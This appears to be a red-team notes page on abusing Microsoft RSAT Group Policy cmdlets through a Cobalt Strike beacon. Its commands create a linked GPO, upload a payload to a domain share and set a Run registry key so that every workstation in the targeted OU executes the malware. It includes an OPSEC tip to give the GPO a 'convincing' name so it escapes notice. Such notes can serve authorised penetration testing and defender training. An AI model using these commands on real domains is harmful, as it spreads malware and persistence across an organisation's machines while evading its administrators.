# Remote Server Administration Tools (RSAT)

RSAT is a management component provided by Microsoft to help manage components in a domain. Since it's a legitimate management tool and often found on management workstations and servers, it can be useful to leverage without having to bring in external tooling.

The GroupPolicy module has several PowerShell cmdlets that can be used for administering GPOs, including:

-   New-GPO: Create a new, empty GPO.
-   New-GPLink: Link a GPO to a site, domain or OU.
-   Set-GPPrefRegistryValue: Configures a Registry preference item under either Computer or User Configuration.
-   Set-GPRegistryValue: Configures one or more registry-based policy settings under either Computer or User Configuration.
-   Get-GPOReport: Generates a report in either XML or HTML format.

## Installations
Check if the GroupPolicy module is installed:
`Get-Module -List -Name GroupPolicy | select -expand ExportedCommands`.
As a local admin install it with:
`Install-WindowsFeature –Name GPMC`

## [[Group Policy (GPO)]]
Create a new GPO and immediately link it to the target OU:

#OPSEC The GPO will be visible in the Group Policy Management Console and other RSAT GPO tools, so make sure the name is "convincing".
``````beacon
beacon> getuid
[*] You are EDU\doe

beacon> powershell New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=edu,DC=evil,DC=corp"

GpoId       : d9de5634-cc47-45b5-ae52-e7370e4a4d22
DisplayName : Evil GPO
Enabled     : True
Enforced    : False
Target      : OU=Workstations,DC=edu,DC=evil,DC=corp
Order       : 4
``````

## Distribute Malware
1. Identify share [[PowerView#Identify Shares]] or create share [[Create Share]]
2. Upload malware
``````beacon
beacon> cd \\dc-2\software
beacon> upload C:\Payloads\pivot.exe
beacon> ls

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 281kb    fil     03/10/2022 13:54:10   pivot.exe
``````
3. Create GPO (be very carefull what you do)
``````beacon
beacon> powershell Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString

DisplayName      : Evil GPO
DomainName       : edu.evil.corp
Owner            : EDU\doe
Id               : d9de5634-cc47-45b5-ae52-e7370e4a4d22
GpoStatus        : AllSettingsEnabled
Description      : 
CreationTime     : 5/26/2022 2:35:02 PM
ModificationTime : 5/26/2022 2:42:08 PM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 1, SysVol Version: 1
WmiFilter        :
``````
4. Wait. Every machine will typically refresh their GPOs automatically every couple of hours.




```meta
requirements: 
results: 
oss: #win
source: Windows additional features
description: Help administrate AD environments
```